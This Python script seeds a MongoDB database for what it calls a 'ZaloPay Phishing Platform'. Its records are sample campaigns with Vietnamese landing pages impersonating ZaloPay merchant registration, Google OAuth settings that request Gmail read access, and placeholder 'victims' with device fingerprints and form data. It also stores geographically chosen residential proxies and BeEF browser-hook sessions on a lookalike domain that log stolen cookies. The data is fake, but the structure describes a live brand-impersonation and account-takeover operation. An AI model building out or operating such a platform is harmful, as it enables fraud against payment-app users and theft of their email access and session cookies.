"""
Seed Data for ZaloPay Phishing Platform
Creates sample data for testing and demonstration
"""

import asyncio
import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
import random

from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError, OperationFailure

logger = logging.getLogger(__name__)

class SeedDataManager:
    """Manage seed data for the platform"""
    
    def __init__(self, mongodb_uri: str):
        self.mongodb_uri = mongodb_uri
        self.client = None
        self.db = None
    
    async def initialize(self):
        """Initialize seed data"""
        try:
            # Connect to MongoDB
            await self._connect_to_mongodb()
            
            # Create sample campaigns
            await self._create_sample_campaigns()
            
            # Create sample victims (for testing)
            await self._create_sample_victims()
            
            # Create sample proxies
            await self._create_sample_proxies()
            
            # Create sample BeEF sessions
            await self._create_sample_beef_sessions()
            
            # Create sample activity logs
            await self._create_sample_activity_logs()
            
            logger.info("Seed data initialization completed successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize seed data: {e}")
            raise
        finally:
            if self.client:
                self.client.close()
    
    async def _connect_to_mongodb(self):
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(self.mongodb_uri)
            self.db = self.client.zalopay_phishing
            
            # Test connection
            self.client.admin.command('ping')
            logger.info("Connected to MongoDB successfully")
            
        except Exception as e:
            logger.error(f"Failed to connect to MongoDB: {e}")
            raise
    
    async def _create_sample_campaigns(self):
        """Create sample campaigns"""
        try:
            campaigns = [
                {
                    "name": "ZaloPay Merchant Onboarding",
                    "description": "Simulate ZaloPay merchant registration process",
                    "status": "active",
                    "target_countries": ["VN", "TH", "MY"],
                    "landing_page": {
                        "title": "Đăng ký Merchant ZaloPay",
                        "content": "Chào mừng bạn đến với ZaloPay Merchant! Vui lòng đăng ký để bắt đầu sử dụng dịch vụ thanh toán của chúng tôi.",
                        "form_fields": [
                            {"name": "business_name", "type": "text", "label": "Tên doanh nghiệp", "required": True},
                            {"name": "contact_person", "type": "text", "label": "Người liên hệ", "required": True},
                            {"name": "phone", "type": "tel", "label": "Số điện thoại", "required": True},
                            {"name": "email", "type": "email", "label": "Email", "required": True},
                            {"name": "business_type", "type": "select", "label": "Loại hình kinh doanh", "options": ["Bán lẻ", "Dịch vụ", "Thương mại điện tử"], "required": True}
                        ]
                    },
                    "oauth_config": {
                        "provider": "google",
                        "client_id": "380849263283-ocv9ulqk3nfqcmllthjo61pb9lvri99e.apps.googleusercontent.com",
                        "scopes": ["email", "profile", "https://www.googleapis.com/auth/gmail.readonly"]
                    },
                    "proxy_strategy": "geographic",
                    "beef_integration": True,
                    "created_at": datetime.now(timezone.utc),
                    "created_by": "admin",
                    "is_active": True
                },
                {
                    "name": "ZaloPay Payment Gateway Setup",
                    "description": "Simulate ZaloPay payment gateway configuration",
                    "status": "active",
                    "target_countries": ["VN"],
                    "landing_page": {
                        "title": "Cấu hình Payment Gateway ZaloPay",
                        "content": "Thiết lập cổng thanh toán ZaloPay cho website của bạn. Tích hợp đơn giản và bảo mật cao.",
                        "form_fields": [
                            {"name": "website_url", "type": "url", "label": "URL Website", "required": True},
                            {"name": "business_category", "type": "select", "label": "Danh mục kinh doanh", "options": ["Thương mại điện tử", "Dịch vụ", "Giáo dục", "Y tế"], "required": True},
                            {"name": "monthly_transaction", "type": "number", "label": "Số giao dịch/tháng", "required": True},
                            {"name": "average_amount", "type": "number", "label": "Giá trị trung bình/giao dịch (VND)", "required": True}
                        ]
                    },
                    "oauth_config": {
                        "provider": "google",
                        "client_id": "380849263283-ocv9ulqk3nfqcmllthjo61pb9lvri99e.apps.googleusercontent.com",
                        "scopes": ["email", "profile"]
                    },
                    "proxy_strategy": "random",
                    "beef_integration": True,
                    "created_at": datetime.now(timezone.utc) - timedelta(days=7),
                    "created_by": "admin",
                    "is_active": True
                },
                {
                    "name": "ZaloPay API Integration",
                    "description": "Simulate ZaloPay API integration process",
                    "status": "draft",
                    "target_countries": ["VN", "TH"],
                    "landing_page": {
                        "title": "Tích hợp API ZaloPay",
                        "content": "Hướng dẫn tích hợp API ZaloPay vào ứng dụng của bạn. Tài liệu chi tiết và hỗ trợ kỹ thuật.",
                        "form_fields": [
                            {"name": "app_name", "type": "text", "label": "Tên ứng dụng", "required": True},
                            {"name": "platform", "type": "select", "label": "Nền tảng", "options": ["Web", "Mobile App", "Desktop"], "required": True},
                            {"name": "programming_language", "type": "select", "label": "Ngôn ngữ lập trình", "options": ["PHP", "Python", "Java", "Node.js", "C#"], "required": True}
                        ]
                    },
                    "oauth_config": {
                        "provider": "google",
                        "client_id": "380849263283-ocv9ulqk3nfqcmllthjo61pb9lvri99e.apps.googleusercontent.com",
                        "scopes": ["email", "profile"]
                    },
                    "proxy_strategy": "round_robin",
                    "beef_integration": False,
                    "created_at": datetime.now(timezone.utc) - timedelta(days=3),
                    "created_by": "admin",
                    "is_active": False
                }
            ]
            
            for campaign in campaigns:
                existing = self.db.campaigns.find_one({"name": campaign["name"]})
                if not existing:
                    result = self.db.campaigns.insert_one(campaign)
                    logger.info(f"Created campaign: {campaign['name']} (ID: {result.inserted_id})")
            
            logger.info("Sample campaigns created successfully")
            
        except Exception as e:
            logger.error(f"Failed to create sample campaigns: {e}")
            raise
    
    async def _create_sample_victims(self):
        """Create sample victims for testing"""
        try:
            # Get campaign IDs
            campaigns = list(self.db.campaigns.find({}, {"_id": 1}))
            if not campaigns:
                logger.warning("No campaigns found, skipping victim creation")
                return
            
            victims = []
            for i in range(10):  # Create 10 sample victims
                campaign_id = random.choice(campaigns)["_id"]
                created_at = datetime.now(timezone.utc) - timedelta(hours=random.randint(1, 72))
                
                victim = {
                    "session_id": f"victim_session_{i+1:03d}",
                    "campaign_id": campaign_id,
                    "ip_address": f"192.168.1.{random.randint(100, 200)}",
                    "user_agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
                    ]),
                    "browser_info": {
                        "name": random.choice(["Chrome", "Safari", "Firefox", "Edge"]),
                        "version": f"{random.randint(100, 120)}.0.0.0",
                        "platform": random.choice(["Windows", "macOS", "iOS", "Android"]),
                        "language": random.choice(["vi-VN", "en-US", "th-TH"]),
                        "timezone": random.choice(["Asia/Ho_Chi_Minh", "Asia/Bangkok", "Asia/Kuala_Lumpur"])
                    },
                    "geolocation": {
                        "country": random.choice(["VN", "TH", "MY"]),
                        "region": random.choice(["Ho Chi Minh", "Bangkok", "Kuala Lumpur"]),
                        "city": random.choice(["Ho Chi Minh City", "Bangkok", "Kuala Lumpur"]),
                        "latitude": random.uniform(10.0, 15.0),
                        "longitude": random.uniform(100.0, 110.0)
                    },
                    "device_info": {
                        "type": random.choice(["desktop", "mobile", "tablet"]),
                        "screen_resolution": random.choice(["1920x1080", "1366x768", "375x667", "414x896"]),
                        "color_depth": random.choice([24, 32]),
                        "pixel_ratio": random.choice([1, 2, 3])
                    },
                    "status": random.choice(["active", "completed", "abandoned"]),
                    "form_data": {
                        "business_name": f"Test Business {i+1}",
                        "contact_person": f"Test Person {i+1}",
                        "phone": f"09{random.randint(10000000, 99999999)}",
                        "email": f"test{i+1}@example.com"
                    },
                    "created_at": created_at,
                    "updated_at": created_at,
                    "last_activity": created_at + timedelta(minutes=random.randint(1, 30))
                }
                victims.append(victim)
            
            # Insert victims
            result = self.db.victims.insert_many(victims)
            logger.info(f"Created {len(result.inserted_ids)} sample victims")
            
        except Exception as e:
            logger.error(f"Failed to create sample victims: {e}")
            raise
    
    async def _create_sample_proxies(self):
        """Create sample proxy entries"""
        try:
            proxies = [
                {
                    "proxy_url": "socks5://proxy1.example.com:1080",
                    "type": "residential",
                    "country": "VN",
                    "provider": "ProxyProvider1",
                    "username": "user1",
                    "password": "pass1",
                    "status": "active",
                    "avg_response_time": 250,
                    "success_rate": 95.5,
                    "last_check": datetime.now(timezone.utc) - timedelta(minutes=5),
                    "notes": "High performance residential proxy",
                    "created_at": datetime.now(timezone.utc) - timedelta(days=30),
                    "updated_at": datetime.now(timezone.utc) - timedelta(minutes=5)
                },
                {
                    "proxy_url": "socks5://proxy2.example.com:1080",
                    "type": "datacenter",
                    "country": "TH",
                    "provider": "ProxyProvider2",
                    "username": "user2",
                    "password": "pass2",
                    "status": "active",
                    "avg_response_time": 180,
                    "success_rate": 98.2,
                    "last_check": datetime.now(timezone.utc) - timedelta(minutes=3),
                    "notes": "Fast datacenter proxy",
                    "created_at": datetime.now(timezone.utc) - timedelta(days=25),
                    "updated_at": datetime.now(timezone.utc) - timedelta(minutes=3)
                },
                {
                    "proxy_url": "socks5://proxy3.example.com:1080",
                    "type": "mobile",
                    "country": "MY",
                    "provider": "ProxyProvider3",
                    "username": "user3",
                    "password": "pass3",
                    "status": "active",
                    "avg_response_time": 320,
                    "success_rate": 92.1,
                    "last_check": datetime.now(timezone.utc) - timedelta(minutes=8),
                    "notes": "Mobile carrier proxy",
                    "created_at": datetime.now(timezone.utc) - timedelta(days=20),
                    "updated_at": datetime.now(timezone.utc) - timedelta(minutes=8)
                },
                {
                    "proxy_url": "socks5://proxy4.example.com:1080",
                    "type": "residential",
                    "country": "VN",
                    "provider": "ProxyProvider1",
                    "username": "user4",
                    "password": "pass4",
                    "status": "inactive",
                    "avg_response_time": 500,
                    "success_rate": 75.0,
                    "last_check": datetime.now(timezone.utc) - timedelta(hours=2),
                    "notes": "Low performance proxy",
                    "created_at": datetime.now(timezone.utc) - timedelta(days=15),
                    "updated_at": datetime.now(timezone.utc) - timedelta(hours=2)
                },
                {
                    "proxy_url": "socks5://proxy5.example.com:1080",
                    "type": "datacenter",
                    "country": "SG",
                    "provider": "ProxyProvider4",
                    "username": "user5",
                    "password": "pass5",
                    "status": "error",
                    "avg_response_time": None,
                    "success_rate": 0.0,
                    "last_check": datetime.now(timezone.utc) - timedelta(hours=1),
                    "notes": "Failed proxy",
                    "created_at": datetime.now(timezone.utc) - timedelta(days=10),
                    "updated_at": datetime.now(timezone.utc) - timedelta(hours=1)
                }
            ]
            
            for proxy in proxies:
                existing = self.db.proxies.find_one({"proxy_url": proxy["proxy_url"]})
                if not existing:
                    result = self.db.proxies.insert_one(proxy)
                    logger.info(f"Created proxy: {proxy['proxy_url']} (ID: {result.inserted_id})")
            
            logger.info("Sample proxies created successfully")
            
        except Exception as e:
            logger.error(f"Failed to create sample proxies: {e}")
            raise
    
    async def _create_sample_beef_sessions(self):
        """Create sample BeEF sessions"""
        try:
            # Get victim IDs
            victims = list(self.db.victims.find({}, {"_id": 1, "session_id": 1}))
            if not victims:
                logger.warning("No victims found, skipping BeEF session creation")
                return
            
            beef_sessions = []
            for i, victim in enumerate(victims[:5]):  # Create sessions for first 5 victims
                created_at = datetime.now(timezone.utc) - timedelta(hours=random.randint(1, 24))
                
                session = {
                    "session_id": f"beef_session_{i+1:03d}",
                    "victim_id": victim["_id"],
                    "victim_session_id": victim["session_id"],
                    "browser_info": {
                        "name": random.choice(["Chrome", "Safari", "Firefox"]),
                        "version": f"{random.randint(100, 120)}.0.0.0",
                        "platform": random.choice(["Windows", "macOS", "iOS"]),
                        "user_agent": f"Mozilla/5.0 (Test Browser {i+1})"
                    },
                    "hook_url": f"https://zalopaymerchan.com/hook.js",
                    "commands_executed": [
                        {
                            "command": "Get Browser Information",
                            "executed_at": created_at + timedelta(minutes=1),
                            "result": {"success": True, "data": {"browser": "Chrome", "version": "120.0.0.0"}}
                        },
                        {
                            "command": "Get Cookie",
                            "executed_at": created_at + timedelta(minutes=2),
                            "result": {"success": True, "data": {"cookies": ["session_id=abc123", "user_pref=dark_mode"]}}
                        }
                    ],
                    "status": random.choice(["active", "completed", "timeout"]),
                    "last_command": created_at + timedelta(minutes=2),
                    "created_at": created_at,
                    "updated_at": created_at + timedelta(minutes=2)
                }
                beef_sessions.append(session)
            
            # Insert BeEF sessions
            result = self.db.beef_sessions.insert_many(beef_sessions)
            logger.info(f"Created {len(result.inserted_ids)} sample BeEF sessions")
            
        except Exception as e:
            logger.error(f"Failed to create sample BeEF sessions: {e}")
            raise
    
    async def _create_sample_activity_logs(self):
        """Create sample activity logs"""
        try:
            # Get victim IDs
            victims = list(self.db.victims.find({}, {"_id": 1, "session_id": 1}))
            if not victims:
                logger.warning("No victims found, skipping activity log creation")
                return
            
            activities = [
                "page_view",
                "form_submit",
                "oauth_login",
                "oauth_callback",
                "beef_hook",
                "beef_command",
                "proxy_assignment",
                "session_start",
                "session_end"
            ]
            
            logs = []
            for victim in victims:
                # Create 3-5 activity logs per victim
                num_logs = random.randint(3, 5)
                for i in range(num_logs):
                    created_at = datetime.now(timezone.utc) - timedelta(hours=random.randint(1, 48))
                    
                    log_entry = {
                        "victim_id": victim["_id"],
                        "session_id": victim["session_id"],
                        "action": random.choice(activities),
                        "details": {
                            "page": random.choice(["/", "/register", "/oauth", "/callback"]),
                            "method": random.choice(["GET", "POST"]),
                            "status_code": random.choice([200, 302, 400, 500]),
                            "response_time": random.randint(100, 2000)
                        },
                        "ip_address": f"192.168.1.{random.randint(100, 200)}",
                        "user_agent": f"Mozilla/5.0 (Test Browser) Chrome/120.0.0.0",
                        "timestamp": created_at,
                        "metadata": {
                            "campaign_id": random.choice(["campaign1", "campaign2"]),
                            "proxy_id": f"proxy_{random.randint(1, 5)}",
                            "beef_session": f"beef_session_{random.randint(1, 5)}"
                        }
                    }
                    logs.append(log_entry)
            
            # Insert activity logs
            result = self.db.activity_logs.insert_many(logs)
            logger.info(f"Created {len(result.inserted_ids)} sample activity logs")
            
        except Exception as e:
            logger.error(f"Failed to create sample activity logs: {e}")
            raise
    
    async def clear_all_data(self):
        """Clear all seed data"""
        try:
            collections = [
                "campaigns",
                "victims", 
                "proxies",
                "beef_sessions",
                "activity_logs",
                "oauth_tokens",
                "gmail_access_logs"
            ]
            
            for collection_name in collections:
                result = self.db[collection_name].delete_many({})
                logger.info(f"Cleared {result.deleted_count} documents from {collection_name}")
            
            logger.info("All seed data cleared successfully")
            
        except Exception as e:
            logger.error(f"Failed to clear seed data: {e}")
            raise

# Convenience functions
async def initialize_seed_data(mongodb_uri: str):
    """Initialize seed data"""
    manager = SeedDataManager(mongodb_uri)
    await manager.initialize()

async def clear_seed_data(mongodb_uri: str):
    """Clear all seed data"""
    manager = SeedDataManager(mongodb_uri)
    await manager._connect_to_mongodb()
    try:
        await manager.clear_all_data()
    finally:
        if manager.client:
            manager.client.close()

# CLI interface
if __name__ == "__main__":
    import sys
    import os
    
    # Setup logging
    logging.basicConfig(level=logging.INFO)
    
    # Get MongoDB URI from environment
    mongodb_uri = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "init":
            # Initialize seed data
            asyncio.run(initialize_seed_data(mongodb_uri))
            
        elif command == "clear":
            # Clear seed data
            asyncio.run(clear_seed_data(mongodb_uri))
            
        else:
            print("Unknown command. Available commands: init, clear")
            sys.exit(1)
    else:
        print("Usage: python seed_data.py <command>")
        print("Commands:")
        print("  init  - Initialize seed data")
        print("  clear - Clear all seed data")
        sys.exit(1)
